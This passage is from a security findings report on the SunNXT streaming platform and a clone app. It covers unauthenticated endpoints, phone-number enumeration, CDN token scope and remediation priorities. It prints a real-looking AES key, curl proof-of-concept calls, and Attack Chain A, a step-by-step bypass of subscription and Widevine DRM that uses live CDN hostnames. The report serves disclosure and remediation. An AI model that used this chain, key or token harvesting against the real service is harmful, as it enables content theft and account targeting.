### VULN-13: PSSH Box in init.mp4 Not Validated

**Severity:** Medium  
**CVSS:** 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:**  
The PSSH (Protection System Specific Header) box embedded in the `init.mp4` segment activates Widevine DRM independently of the MPD manifest's `<ContentProtection>` element. Even if `ContentProtection` is stripped from the MPD (e.g., by a rewriting proxy), the browser's CDM still detects DRM via the PSSH box in init.mp4 and fires a license request.

**Impact:**  
DRM cannot be stripped by manifest manipulation alone. Combined with VULN-11, the browser automatically requests a license (which is granted without auth).

**Note:** This is technically correct behavior (defense-in-depth), but the protection is defeated by VULN-11.

---

### VULN-14: Unauthenticated Clear-Session Endpoint

**Severity:** Medium  
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)

**Description:**  
The endpoint `GET /api/auth/clear-session` triggers `forceRelogin()` on the server — invalidating the current server session and forcing a fresh login with `.env.local` credentials. This endpoint has no authentication check.

**Impact:**  
Any unauthenticated user (or automated script) can repeatedly call this endpoint to:
- Force the server to consume login API quota
- Trigger unnecessary re-authentication cycles
- Potentially lock out the server account via failed login attempts if credentials change

**Proof of Concept:**
```bash
# No auth required — any unauthenticated request works:
curl -s "http://localhost:3000/api/auth/clear-session"
# Returns: {"ok":true}
# Server now re-authenticates with SunNXT
```

**Fix:** Require authentication (admin token or internal-only access) for this endpoint.

---

### VULN-15: Phone Number Enumeration via Status Endpoint

**Severity:** Medium  
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Description:**  
The endpoint `GET /api/auth/status?mobile=<phone>` returns detailed account information for any phone number without authentication:
- `user_available: true/false` — whether the account exists
- `subscription_status: active/inactive` — subscription state
- `password_available: true/false` — whether a password is set

**Impact:**  
Allows enumeration of any SunNXT user's account status and subscription without any credentials. Can be used for targeted phishing (identify high-value targets), subscriber count estimation, or account existence probing.

**Proof of Concept:**
```bash
curl -s "http://localhost:3000/api/auth/status?mobile=9876543210"
# Returns: {"user_available":true,"subscription_status":"active","password_available":true}
```

**Fix:** Require authentication before returning account status. Return only boolean "account exists" without subscription details. Implement rate limiting.

---

### VULN-16: Server Subscription Session Proxied to All Unauthenticated Users

**Severity:** Critical  
**CVSS:** 9.3 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

**Description:**  
The `/api/download` and `/api/stream-proxy` endpoints attach the server's `.env.local` session cookie to all requests, including those from completely unauthenticated browser users. This means any user who accesses the clone can:
1. Download subtitle files using the server's subscription credentials
2. Stream proxied CDN content authenticated with the server's session

**Impact:**  
The server's paid subscription effectively becomes a shared resource for any internet user who knows the clone's URL. This is the most critical vulnerability in the application design — it creates an unauthenticated premium content gateway.

**Proof of Concept:**
```bash
# No browser login required — just call the proxy endpoint directly:
curl -s "http://localhost:3000/api/stream-proxy?url=<cdn-url>"
# Returns: CDN content authenticated with server's subscribed session
```

**Fix:** Verify browser session before proxying. Require the user's own session for stream/download requests. Never attach server credentials to unauthenticated user requests.

---

### VULN-17: Heartbeat Parameter Injection

**Severity:** Low  
**CVSS:** 3.1 (AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N)

**Description:**  
The `/api/heartbeat` endpoint passes `contentId` and `action` query parameters directly to pwaapi without sanitization:
```
GET /api/heartbeat?contentId=<id>&action=<Start|Stop>
```
These are forwarded as-is to:
```
POST pwaapi.sunnxt.com/heartbeat?content_id=<id>&action=<action>
```

**Impact:**  
A logged-in user can send arbitrary heartbeat events for any content ID (not just content they are watching). This pollutes watch history analytics and can inflate view counts for specific content.

**Fix:** Validate `action` against an allowlist (`["Start", "Stop"]`). Verify `contentId` exists and belongs to a content item the user is authorized to watch.

---

### VULN-18: AES Key Present in 4 Source Files

**Severity:** Informational  
**CVSS:** 2.0 (AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N)

**Description:**  
The AES key `A3s68aORSgHs$71P` appears in 4 different source files in this research project (not just one). While this is a research artifact, it demonstrates how easily secrets proliferate when not stored in environment variables.

**Files affected:**
- `lib/sunnxt-session.ts`
- `app/api/media/[contentId]/route.ts`
- `app/api/auth/login/route.ts`
- `security-tests/decrypt-test.js`

**Fix:** Extract the key to `SUNNXT_MEDIA_KEY` environment variable. Use `process.env.SUNNXT_MEDIA_KEY` in all locations.

---

### VULN-19: MPD BaseURL Injection via Regex

**Severity:** Informational  
**CVSS:** 2.0 (AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N)

**Description:**  
The stream-proxy's MPD rewriting uses regex string replacement to inject `<BaseURL>` tags. If an MPD contains malformed XML that matches the regex unexpectedly, the injection could produce invalid XML.

**Impact:**  
Negligible — attacker would need to control CDN content (impractical). Server-controlled behavior.

**Fix:** Use an XML parser for MPD rewriting instead of regex. Validate the resulting XML before returning.

---

### VULN-20: Permanent UUIDs + No CDN Token Rotation = Permanent Access

**Severity:** High  
**CVSS:** 8.2 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

**Description:**  
The combination of permanent content UUIDs (VULN-12) and the 24-hour wildcard hdntl token (VULN-06) creates a permanent access path:

1. UUID never rotates → CDN path is permanent
2. hdntl `acl=/*` → one token covers all content
3. hdntl self-refreshes from MPD segment templates → token auto-renews
4. No subscription check at CDN layer → subscription is irrelevant once token is held

**Impact:**  
A one-time subscription (or a borrowed session from any subscriber) provides:
- Permanent CDN paths (forever)
- Auto-renewing CDN tokens (24h → refresh → 24h → ...)
- DRM keys without auth (VULN-11)

This constitutes effective permanent access to the content library without an ongoing subscription.

**Fix:** 
1. Rotate CDN content paths periodically (monthly)
2. Scope hdntl tokens per-content (not wildcard)
3. Add subscription validation at CDN layer (Akamai EdgeLogic or similar)
4. Fix VULN-11 (most critical prerequisite)

---

## 10. Attack Chains

### Attack Chain A: Full Premium Content Bypass (No Subscription)

**Prerequisites:** One valid SunNXT session (even free tier)

**Steps:**
1. Log in to SunNXT free account (VULN-10 — no rate limit makes this fast)
2. Watch any free content → browser receives hdntl token (`acl=/*`)
3. Extract hdntl token from DevTools (Application → Cookies → `hdntl`)
4. Look up target content UUID from UUID_DB or any prior API response
5. Construct CDN URL: `https://movies1-suntvvod1.akamaized.net/movies1/<UUID>/auto/index.mpd?hdntl=<token>`
6. Load MPD → Shaka detects Widevine ContentProtection → fires license request
7. Send license request to `modularLicense` without any auth (VULN-11)
8. Receive valid Widevine key → stream decrypts → premium content plays

**Vulnerabilities used:** VULN-06 + VULN-12 + VULN-11  
**Remediation priority:** Fix VULN-11 first (blocks DRM key issuance).

---

### Attack Chain B: Server Session Sharing (Critical)

**Prerequisites:** Clone deployed with server credentials

**Steps:**
1. Find the deployed clone URL (public or shared)
2. Call `/api/stream-proxy?url=<any-cdn-url>` directly (no login needed)
3. Server attaches its subscribed session cookie to the CDN request (VULN-16)
4. CDN accepts the authenticated request, returns content
5. Repeat for any content

**Vulnerabilities used:** VULN-16  
**Impact:** Unlimited unauthenticated premium access via the server's subscription.

---

### Attack Chain C: Account Enumeration + Targeted Attack

**Prerequisites:** Phone number list

**Steps:**
1. Call `/api/auth/status?mobile=<phone>` for each number in list
2. Identify accounts with `user_available: true` AND `subscription_status: active`
3. These are active paying subscribers → high-value targets for phishing
4. Use credential stuffing on their accounts (VULN-10 — no rate limit)

**Vulnerabilities used:** VULN-15 + VULN-10

---

## 11. API Endpoint Reference

### Authentication

| Method | Endpoint | Auth | Description |
|---|---|---|---|
| POST | `/api/auth/login` | No | Login with phone/email + password |
| POST | `/api/auth/logout` | Session | Logout and clear cookies |
| GET | `/api/auth/status?mobile=<phone>` | **None** | Account status lookup (VULN-15) |
| GET | `/api/auth/clear-session` | **None** | Force server re-login (VULN-14) |

### Content

| Method | Endpoint | Auth | Description |
|---|---|---|---|
| GET | `/api/media/[contentId]` | Session | Stream URLs + metadata |
| GET | `/api/content/[contentId]` | Session | Content detail |
| GET | `/api/search?q=<query>` | Session | Search |
| GET | `/api/trending` | Session | Trending searches |

### Streaming

| Method | Endpoint | Auth | Description |
|---|---|---|---|
| GET | `/api/stream-proxy?url=<cdn-url>` | None (VULN-16) | CDN CORS proxy |
| POST | `/api/license?content_id=<id>` | Session | DRM license proxy |
| GET | `/api/download?url=<subtitle-url>` | None (VULN-16) | File download proxy |
| POST | `/api/heartbeat?contentId=<id>&action=<act>` | Session | Watch tracking |

### External (SunNXT Direct)

| Endpoint | Auth | Description |
|---|---|---|
| `pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=<id>` | **None (VULN-11)** | Widevine DRM license |
| `pwaapi.sunnxt.com/heartbeat` | Session | Heartbeat relay |
| `www.sunnxt.com/next/api/media/<id>` | Session | Media API (encrypted) |
| `pwaapi.sunnxt.com/content/v3/contentDetail/<id>/` | Session | PWA content detail |

---

## 12. Code Architecture

### Module Map

```
lib/
├── sunnxt-session.ts     # Session management (login, cache, device bypass)
├── cdn-bypass.ts         # UUID DB, hdntl cache, bypass entry builder
└── api.ts                # Client-side API helpers (browse, search, etc.)

app/api/
├── media/[contentId]/    # Stream resolver + 3-path bypass logic
├── stream-proxy/         # CDN CORS proxy + MPD/HLS rewriter
├── license/              # DRM license proxy (Widevine/PlayReady)
├── auth/
│   ├── login/            # Login proxy (BFF + pwaapi paths)
│   ├── logout/           # Logout + cookie clear
│   ├── status/           # Account status (VULN-15)
│   └── clear-session/    # Session reset (VULN-14)
├── heartbeat/            # Watch session relay (VULN-17)
├── search/               # Search proxy
├── content/[contentId]/  # Content detail proxy
├── download/             # File/subtitle download proxy (VULN-16)
└── trending/             # Trending searches proxy
```

### Key Functions

| Function | Location | Purpose |
|---|---|---|
| `getSunnxtCookies()` | `lib/sunnxt-session.ts` | Return cached or fresh session cookie |
| `forceRelogin()` | `lib/sunnxt-session.ts` | Invalidate session + re-authenticate |
| `decrypt(response)` | `app/api/media/.../route.ts` | AES-CBC decrypt API response |
| `buildBypassEntries(contentId)` | `lib/cdn-bypass.ts` | Build CDN URLs from UUID + hdntl |
| `extractAndCacheHdntl(entries)` | `lib/cdn-bypass.ts` | Harvest + save hdntl from video URLs |
| `learnUuidsFromEntries(id, entries)` | `lib/cdn-bypass.ts` | Learn UUID from video entry URLs |
| `harvestBypassData(id, data)` | `app/api/media/.../route.ts` | Extract hdntl + UUIDs from response |
| `normalizeVideos(data)` | `app/api/media/.../route.ts` | Ensure all links are absolute URLs |

---

## 13. Remediation Reference

### Priority Order (by impact)

| Priority | Vulnerability | Fix Effort | Impact Reduction |
|---|---|---|---|
| P0 | VULN-11: modularLicense no auth | Low (add auth check) | Eliminates DRM bypass |
| P0 | VULN-16: Server session shared to all users | Low (add session check) | Eliminates premium access for unauthenticated users |
| P1 | VULN-01: Static AES key | High (architecture change) | Eliminates API decryption |
| P1 | VULN-06: hdntl wildcard scope | Medium (CDN config) | Scopes CDN access per-content |
| P2 | VULN-10: No rate limiting | Low (add middleware) | Prevents credential stuffing |
| P2 | VULN-15: Phone enumeration | Low (add auth check) | Prevents account enumeration |
| P2 | VULN-14: Unauthenticated clear-session | Low (add auth check) | Prevents session disruption |
| P3 | VULN-20: Permanent UUIDs | High (CDN restructure) | Breaks static CDN paths |
| P3 | VULN-12: No UUID rotation | High (CDN restructure) | Eliminates permanent CDN access |
| P4 | VULN-04: Long-lived sessions | Medium (session policy) | Limits hijack window |
| P4 | VULN-03: Device limit bypass | Medium (session logic) | Enforces concurrent device limits |
| P4 | VULN-02: Zero IV | Low (crypto fix) | Strengthens existing encryption |

### Immediate Actions (Can Be Done Today)

1. **Add auth check to `modularLicense`** — validate Bearer token in request
2. **Add session check to `/api/stream-proxy` and `/api/download`** — require browser session
3. **Add auth check to `/api/auth/clear-session`** — require admin token
4. **Scope hdntl tokens** — change CDN config to use `acl=!*/UUID/*~` instead of `acl=/*`
5. **Add login rate limiting** — 10 attempts per 15 minutes per IP/phone

---

*This document covers all research findings as of May 23, 2026. Future research may uncover additional vulnerabilities.*
